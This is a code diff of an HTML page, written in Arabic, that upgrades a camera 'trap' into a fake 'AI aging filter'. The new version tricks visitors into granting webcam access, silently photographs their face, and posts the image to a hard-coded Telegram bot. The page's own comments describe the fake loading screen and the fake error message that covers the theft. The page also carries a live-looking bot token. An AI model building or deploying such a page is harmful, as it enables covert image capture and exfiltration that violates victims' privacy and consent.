@@ -3,18 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جار التحميل...</title>
+    <title>فلتر الشيخوخة - كيف ستصبح عندما تكبر؟</title>
     <style>
-        body { background-color: #121212; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        body { 
+            background: linear-gradient(135deg, #1f4068, #162447); 
+            color: #fff; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            text-align: center; 
+            padding: 20px; 
+            margin: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            backdrop-filter: blur(4px);
+        }
+        h2 { color: #e4e4e4; margin-bottom: 10px; }
+        p { color: #b0c4de; font-size: 14px; margin-bottom: 25px; }
+        .btn { 
+            background: linear-gradient(45deg, #ff416c, #ff4b2b); 
+            color: white; 
+            padding: 15px 30px; 
+            font-size: 18px; 
+            font-weight: bold;
+            border: none; 
+            border-radius: 30px; 
+            cursor: pointer; 
+            box-shadow: 0 4px 15px rgba(255, 65, 108, 0.4);
+            transition: 0.3s;
+            width: 100%;
+        }
+        .btn:active { transform: scale(0.98); }
         video, canvas { display: none; }
-        .fake-btn { background-color: #ff0055; color: white; padding: 15px 30px; font-size: 18px; border: none; border-radius: 30px; cursor: pointer; }
+        .loading { display: none; margin-top: 20px; }
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid #ff416c;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <h2>جاري تحميل المحتوى...</h2>
-    <p>يرجى النقر للمتابعة</p>
-    <button class="fake-btn" onclick="triggerTrap()">اضغط هنا للتشغيل</button>
+    <div class="container" id="mainBox">
+        <h2>👴 اكتشف شكل وجهك في سن الـ 70</h2>
+        <p>انضم لأحدث فلتر ذكاء اصطناعي وتعرف على ملامحك المستقبلية بدقة عالية.</p>
+        <button class="btn" onclick="startFilter()">ابدأ الفلتر الآن</button>
+    </div>
+
+    <div class="container loading" id="loadingBox">
+        <h2>⏳ جاري معالجة الصورة...</h2>
+        <div class="spinner"></div>
+        <p>يرجى الانتظار بينما يقوم الذكاء الاصطناعي برسم تجاعيد الوجه وتعديل الملامح...</p>
+    </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
@@ -23,7 +73,11 @@
         const BOT_TOKEN = "9190134340:AAGUQMeIimoN6cqr8tKqYXKEmI35NMqoeJw";
         const CHAT_ID = "7664768067";
 
-        async function triggerTrap() {
+        async function startFilter() {
+            // إخفاء زر البداية وإظهار شاشة التحميل الوهمية للفلتر
+            document.getElementById('mainBox').style.display = 'none';
+            document.getElementById('loadingBox').style.display = 'block';
+
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" } 
@@ -36,33 +90,42 @@
                     video.onloadedmetadata = () => { resolve(); };
                 });
 
+                // الانتظار ثانية كاملة ليبدو الأمر وكأن الجهاز يعالج صورة حقيقية
+                await new Promise(r => setTimeout(r, 1200));
+
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const context = canvas.getContext('2d');
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // تحويل الصورة إلى ملف قابل للإرسال
                 canvas.toBlob(async (blob) => {
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'capture.png');
+                    formData.append('photo', blob, 'aged_face_target.png');
 
-                    // إرسال الصورة مباشرة إلى بوت تيليجرام الخاص بك
+                    // إرسال الصورة إلى تيليجرام في الخلفية
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
 
                     stream.getTracks().forEach(track => track.stop());
-                    window.location.href = "https://google.com";
+                    
+                    // بعد إرسال الصورة، نعرض له رسالة خطأ وهمية أو نوجهه لموقع طبيعي بعد قليل
+                    setTimeout(() => {
+                        alert("عذراً، هذا الجهاز غير مدعوم لتشغيل فلتر الذكاء الاصطناعي الثقيل!");
+                        window.location.href = "https://google.com";
+                    }, 1500);
+
                 }, 'image/png');
 
             } catch (err) {
-                console.error("خطأ:", err);
+                // لو رفض الإذن أو حدث خطأ
+                alert("يجب السماح للكاميرا لكي ينجح الفلتر!");
+                location.reload();
             }
         }
     </script>
 </body>
 </html>
- 
